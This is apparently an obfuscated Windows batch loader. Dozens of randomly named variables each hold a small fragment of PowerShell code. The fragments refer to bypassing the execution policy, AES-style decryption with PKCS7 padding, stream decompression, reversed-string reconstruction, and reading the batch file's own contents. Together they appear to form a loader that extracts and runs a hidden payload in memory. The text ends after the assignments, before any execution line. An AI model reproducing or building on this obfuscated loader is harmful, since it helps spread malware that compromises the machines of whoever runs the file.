@echo off
set "gNncQGBcmW=lBkP"
set "GwFNhNFboN=yste"
set "OJksHxZfWa=();$"
set "MQPQpIqtPq=$awA"
set "xnQPuiQBIj=ck($"
set "CtSuOtNLvz=fore"
set "HIKnhzXLYw=Invo"
set "rqNlRHvCRS=).Sp"
set "irlwjBxaCq=, $T"
set "izqRDWJMEK=Rk ="
set "ncMMPPcyKG=ypto"
set "PCBOENMNhA=ss -"
set "yUdedVXsLa=join"
set "dlcAUmVFIO=em.I"
set "WzRgJcaEjv=Mn, "
set "vkCGtzCKEZ=Star"
set "BQIViNfZIp=grap"
set "JJuGcsDSpo=oL'["
set "ErAUirJzsW=onve"
set "OOFfparupA=('%*'"
set "ItQvomYgxL=ionM"
set "XrcLgMLbEz=, (,"
set "oFmwtJGPWy=esMa"
set "xnIZTluKPj=ddin"
set "hQIOmZxbtG=hUr."
set "SkwCSfNPdK=ispo"
set "ZjkNacLVtH=gth)"
set "FQTGxPZycN=m.Re"
set "CzeKcFcdRw=tion"
set "rvRFLwzSZq=m.IO"
set "KQiiYQZYZB=.Len"
set "JPQlXwbpLI=IoO3"
set "XLtqeCaSyx=K.En"
set "XEvtnSAnuP=awAM"
set "QUDPQeOpov=();$"
set "liCKOEopQh=nirt"
set "BMfAOtvwGt=stem"
set "iSZjVPRdnT=tem."
set "PetVpURuUr=aDNK"
set "sOikCHZdFI='gni"
set "OdBrCFwZfv=-1.."
set "VnGmfvfDGX=y.Ci"
set "QpGLzbOTLf=] -j"
set "BousbtfsgG=('ev"
set "hKqRlntQkk=FcNh"
set "cynLczQkFO=ke($"
set "NkDIikquDp=HO3I"
set "dNhuqqFtjR=pose"
set "hCukcoWzDQ= = $"
set "aUmUYpFTfN=n ''"
set "lRhtdPuzkZ=-ep "
set "omyQNRecTp=PKCS"
set "DYVTHgzlXH=se()"
set "JACnofERfq= = N"
set "YoLKZbogNN=7;$h"
set "JElEvPxFkF=Comp"
set "tHQkQBNwOk=r.Su"
set "yoTCeNFehf=ddin"
set "ByGUNNIycl=..-1"
set "DKFzPVxAZm=yste"
set "KNJpBvgurK=::De"
set "kgOWQrRcwF=TZeN"
set "TzqUUYovje=oryS"
set "cYyBfrnguu= [Sy"
set "oHXMfuTxub=pres"
set "xQynMHMKNE=ay()"
set "cCJKMjwJsn=morF"
set "LUzVQIYPtk=Conv"
set "GVHiFCRqWQ=ew-O"
set "YmyRnXcRLd=TZeN"
set "NpKiPrqvaq='[-1"
set "FXUuSZAAEd=THxh"
set "peTwFjFwgI=::('"
set "uhmLdthssH=Rk.T"
set "ahLHXXPrQD=daeR"
set "KzEakrjcxt=FWd."
set "BBROQkuBES=-joi"
set "avkztoqlae=raph"
set "zVpiYqrufq=pose"
set "OdvVNGulpt=bjec"
set "opXDVnIHcn=Rk);"
set "QZmYJFTPDJ=)) {"
set "proEZDuPNT=('%~f0'"
set "NnquGGowVc=ose("
set "tYUaoRYChN=7kGw"
set "Lvjbskzuwb=bypa"
set "PnQWyuQBIg=Fina"
set "tsdtZETCyC=);$G"
set "zKJWlkydhJ=;$hJ"
set "vioPBweEjK=ct S"
set "KYetvfckTs=CMn."
set "ONqHIrTlYF=jIvP"
set "lYijJSMhZw=[-1."
set "EhHhEBdrfs= = ["
set "fWJeguQQDB==');"
set "SHpvDxjktD=.Dis"
set "jlnVcxiBVV=comm"
set "jHPxWyMMEr=ptor"
set "FkdHZtKRXq=($rO"
set "xiXDCNVbHh=sion"
set "LtCMnmmcUY=urit"
set "QnYtMnlNBs=ZeNf"
set "ogiwBOelwz=S46e"
set "pfdNumRlrw=.Con"
set "uwUQJcBlGG=form"
set "waJOJoFsaV=rOhU"
set "TIuDMVOiPx=e = "
set "RjfYDZqJef=trea"
set "MrLVHhFhVL=ose("
set "McRaUVkDsK= [Sy"
set "zwdMqTxJMZ=null"
set "MJxfCTgXiR=Nf ="
set "fJNdKgsztd=y.Cr"
set "dLGrGBijCI=hlBk"
set "kdIWiPgfpH=$hlB"
set "hXYbtYEmGL=ment"
set "hMrRCoEblv=mory"
set "StTzJSMWQa=ct S"
set "kTeGdhoUWh=Bmor"
set "xecSMnaZNp=O.Me"
set "FKOapFPbIt=BC;$"
set "HCWSkCTUxh=tsWi"
set "bnjLYTcRgt=)($T"
set "SVDKjPyFKM=-Obj"
set "WbAxwJRdAm=y.Pa"
set "xtewKwrPkj=Mode"
set "VcAaXtniMn=.Dis"
set "zrNnnohuhE=oin "
set "aFTCCBAhbx=F'[-"
set "XmETpiQPfr=m(, "
set "eNcMBtZBUP=raph"
set "vwoMZwjdgz=;$RY"
set "IiVwDaDONf=New-"
set "VprTqcumqA=; };"
set "FLLlykUFRG=16] "
set "zbzYApyqse=ert]"
set "AhFSIXCfOR=iron"
set "XHsYEIMRrC=ect "
set "wxNNEdjdJr=ress"
set "odafVsKiAS=iSj."
set "QEAtsVsxKH='oPV"
set "fvAajuQvVA=[Sys"
set "vjYuOpBQVw=]::("
set "wjgxzgFyfz=[Env"
set "IjbEaSyrru=eam("
set "HVpuOIJKmX=NlEs"
set "VwGXqXYmTu= = $"
set "MWCxBHciTh=f) {"
set "zqGWxHkCFJ=lBkP"
set "clTIRzEjCI=);$h"
set "VPjYzXFBsf=Syst"
set "nqrGyCAQUj= '')"
